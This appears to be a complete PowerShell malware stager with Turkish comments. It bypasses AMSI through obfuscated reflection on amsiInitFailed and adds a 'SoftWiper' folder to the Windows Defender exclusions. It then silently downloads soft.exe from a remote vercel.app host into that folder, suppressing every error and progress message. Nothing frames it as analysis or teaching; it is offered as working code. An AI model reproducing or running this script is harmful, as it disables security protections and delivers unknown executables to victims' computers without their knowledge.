$yes = [Ref].Assembly.GetType('Sys' + 'tem.Managem' + 'ent.Aut' + 'omation.Amsi' + 'Utils')
$game = $yes.GetField('amsiIn' + 'itFai' + 'led', 'NonPu' + 'blic,St' + 'atic')
$game.SetValue($null, $true)

$softWiperPath = "C:\Program Files\SoftWiper"
if (-not (Test-Path $softWiperPath)) {
    New-Item -Path $softWiperPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
}

# Windows Defender İstisnası (Klasörü virüs taraması dışına alır)
Add-MpPreference -ExclusionPath $softWiperPath -ErrorAction SilentlyContinue


$folderPath = "C:\Program Files\SoftWiper"
$filePath = Join-Path $folderPath "soft.exe"
$url = "https://vercel.app"

# Klasör yoksa arka planda oluşturur
if (-not (Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}

# Hataları ve ilerleme çubuğunu gizleyerek sessizce indirir
try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $filePath -ErrorAction SilentlyContinue
} catch {
    # Hata durumunda da ekrana hiçbir şey yazmaz
}